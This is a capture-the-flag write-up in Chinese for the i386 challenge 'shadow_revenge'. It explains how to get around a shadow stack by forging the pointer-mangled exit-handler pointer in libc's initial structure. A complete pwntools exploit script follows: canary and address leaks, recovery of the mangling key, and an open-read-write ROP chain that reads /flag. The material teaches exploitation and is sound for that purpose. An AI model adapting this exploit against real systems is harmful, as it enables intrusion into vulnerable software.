PWN ｜ shadow_revenge


本题存在栈溢出漏洞, 利用漏洞可以实现任意地址写. 但是函数的返回地址和 save_ebp 都被备份在了另一个栈上, 无法直接通过覆盖返回地址劫持控制流.


所以选手需要通过别的方式劫持控制流(malloc_hook, realloc_hook, free_hook 等不行, 因为没有malloc/free).

我们先了解一下 exit_function_list 结构体. 相关定义如下


而在libc中有个全局结构体实例 initial


我们在gdb里面也可以直接看到

当程序调用exit的时候, exit中会调用 __run_exit_handlers(status, &_exit_funcs, true), 而在该函数中会调用 initial结构体中的函数指针.


所以如果我们可以利用任意地址写修改这个结构体, 就可以劫持控制流了. 但是这儿注意到实际调用函数指针之前对函数指针有个 PTR_DEMANGLE的操作. 在 i386架构下这个宏是这么定义的:

调试可以发现汇编代码如下


而在 gs:[0x18]中存储的是一个随机数

显然, 这儿的函数指针被加密了，所以，我们如果想要劫持控制流的话, 就得把目标函数地址进行编码之后替换掉原来的函数指针，因此，我们需要拿到 gs:[0x18]的值。 


方法就是利用initial中初始的函数指针。首先利用漏洞实现任意地址读写获取到原来的后的函数指针, 然后经过调试可以发现这个函数指针解码后指向的是 ld 中的 dl_fini 函数。因此我们leak了 ld 的基地址之后就可以获得 dl_fini 的地址, 结合 编码后的函数指针可以计算出 gs:[0x18] 的值。


而且通过源码可以看到这儿调用函数的时候第一个参数是可以控制的，所以我们可以先 leak 栈的地址, 然后调用 gets. 覆盖返回地址, 构造 orw 的 rop链, 从而拿到 flag。


总结一下exp利用流程大概如下

1.Leak canary

2.利用 .dynamic 中的 DEBUG 项 Leak ld.so 基地址, 计算出 dl_fini 地址

3.Leak libc.基地址

4.利用 libc 中的 environ 变量 leak 栈地址

5.Leak initial 结构体中的 编码后的函数指针

6.通过编码后的函数指针和 dl_fini 地址计算出 gs:[0x18]

7.用计算得到的 gs:[0x18] 编码 gets 的地址, 并替换原来的函数指针

8.修改第一个参数为栈地址. (调用gets 的时候可以覆盖到 返回地址即可)

9.调用exit, 触发 get(stack_address)

10.输入 orw rop 链. 拿到flag

from pwn import *
from time import sleep
import sys

global io

context(arch = 'i386', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

filename = "./pwn_r"
ip = "127.0.0.1"
port = 8888
if len(sys.argv) == 3:
    ip = sys.argv[1]
    port = int(sys.argv[2])

LOCAL = True if len(sys.argv)==1 else False

elf = ELF(filename)

remote_libc = "./libc.so.6_r"
if LOCAL:

    io = process(filename, env={'LD_PRELOAD': remote_libc})
    libc = ELF(remote_libc)
else:
    context.log_level = 'debug'
    io = remote(ip, port)
    libc = ELF(remote_libc)

def lg(name, val):
    log.info(name+" : "+hex(val))

def rol(int_value, k ,bit = 32):
    bit_string = '{:0%db}' % bit
    bin_value = bit_string.format(int_value) # 8 bit binary
    bin_value = bin_value[k:] + bin_value[:k]
    int_value = int(bin_value,2)
    return int_value

def ror(int_value, k ,bit = 32):
    bit_string = '{:0%db}' % bit
    bin_value = bit_string.format(int_value) # 8 bit binary
    bin_value = bin_value[-k:] + bin_value[:-k]
    int_value = int(bin_value,2)
    return int_value

g_stack_base = 0x804B02C

# leak canary
io.sendlineafter( "name :", 'pu1p')
io.sendlineafter( "length : ", '-1')
io.sendafter( "message : ", 'a'*33)
io.recvuntil( 'a'*33)
canary = u32('\0'+io.recv( 3))
lg('canary', canary)

# leak ld.so base
dynamic_debug = 0x804AF28 + 4
io.sendlineafter( "y/n", 'n')
io.sendlineafter( "length : ", '-1')
io.sendafter( "message : ", flat('a'*32, canary, '\0'*0x10, dynamic_debug, 0x7fffff, 0x20))
io.recvuntil( "<")
ld_base = u32(io.recv( 4)) - 0x24904
lg("ld_base", ld_base)


# leak libc base
''' got table
.got:0804AFCC printf_ptr      dd offset printf        ; DATA XREF: _printf↑r
.got:0804AFD0 puts_ptr        dd offset puts          ; DATA XREF: _puts↑r
.got:0804AFD4 strlen_ptr      dd offset strlen        ; DATA XREF: _strlen↑r  
'''
io.sendlineafter( "y/n", 'n')
io.sendlineafter( "length : ", '-1')
io.sendafter( "message : ", \
    flat('a'*32, canary, '\0'*0x10, 0x0804AFCC, 0x10, 111))
io.recvuntil( "<")
printf_addr = u32(io.recv( 4))
lg("printf_addr", printf_addr)
libc.address = printf_addr - libc.symbols['printf']
puts_addr = u32(io.recv( 4))
lg("puts_addr", puts_addr)
lg("libc base", libc.address)

# leak stack address
environ_addr = libc.symbols['environ']
io.sendlineafter( "y/n", 'n')
io.sendlineafter( "length : ", '-1')
io.sendafter( "message : ", \
    flat('a'*32, canary, '\0'*0x10, environ_addr, 0x10, 0xffff))
io.recvuntil( "<")
stack_addr = u32(io.recv( 4))
lg("stack_addr", stack_addr)

initial_addr = libc.address + 0x1b11e0
decoded_func = ld_base + 0xf880

lg("initial address", initial_addr)
lg("decoded_func", decoded_func)

# leak encoded function pointer, calc gs:[0x18]
io.sendlineafter( "y/n", 'n')
io.sendlineafter( "length : ", '-1')
io.sendafter( "message : ", \
    flat('a'*32, canary, '\0'*0x10, initial_addr+0xc, 0x10, 0xffff))
io.recvuntil( "<")
encoded_func = u32(io.recv( 4))
lg("encoded_func", encoded_func)
gs_18 = ror(encoded_func, 9) ^ decoded_func
lg("gs_18", gs_18)

# replace function pointer in initial
encoded_gets_addr = rol(libc.symbols['gets'] ^ gs_18, 9)
open_addr = libc.symbols['open']
read_addr = libc.symbols['read']
write_addr = libc.symbols['write']

stack2 = stack_addr - 0x130
io.sendlineafter( "y/n", 'y')
io.sendlineafter( "name :", flat(encoded_gets_addr, stack2, "/flag\0"))
flag_addr = initial_addr + 0x14
io.sendlineafter( "length : ", '-1')
io.sendafter( "message : ", \
    flat('a'*32, canary, '\0'*0x10, initial_addr+0xc, 0x10, 0))

# orw rop
P2R = 0x0804899a
P3R = 0x0804890e
bss_buf = 0x804b000+0x800
rop = flat(
    open_addr, P2R, flag_addr, 0,
    read_addr, P3R, 3, bss_buf, 0x100,
    write_addr, P3R, 1, bss_buf, 0x100,
)

sleep(1)
io.sendline( rop)


io.interactive()
